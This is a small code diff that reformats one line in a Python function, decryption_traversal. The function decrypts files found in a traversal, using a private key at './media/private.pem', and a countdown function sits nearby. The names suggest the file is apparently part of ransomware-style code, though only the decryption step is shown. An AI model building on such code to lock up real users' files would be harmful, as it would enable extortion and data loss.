@@ -108,8 +108,7 @@ def decryption_traversal():
         filePath = Path(item)
         fileType = filePath.suffix.lower()
 
-        if fileType in EXCLUDED_EXTENSIONS:
-            continue
+        if fileType in EXCLUDED_EXTENSIONS: continue
         decrypt(str(filePath), './media/private.pem')
 
 def countdown(count):
